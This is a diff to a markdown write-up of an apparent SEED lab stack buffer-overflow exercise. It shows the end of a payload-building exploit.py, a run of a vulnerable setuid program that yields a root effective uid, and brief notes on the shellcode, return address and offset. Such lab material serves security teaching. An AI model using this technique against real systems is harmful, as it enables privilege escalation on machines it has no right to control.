@@ -41,3 +41,20 @@ L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
 content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
 ##################################################################
 ```
+
+4. Generate the payload and then attack.
+
+```sh
+[10/06/22]seed@VM:~/code$ ./exploit.py
+[10/06/22]seed@VM:~/code$ ./stack-L1
+Input size: 517
+#id
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm)
+```
+Got root privileges.
+
+Additional explanations about the exploit.py modifications.
+- The shellcode is copied, which is 32bit assembly version of the shellcode.
+- ret is the return adress, returning the first instruction of the shellcode
+- offset is the interval between ebp and buffer addresses
+- L equal to 4 is a 32 bit program.
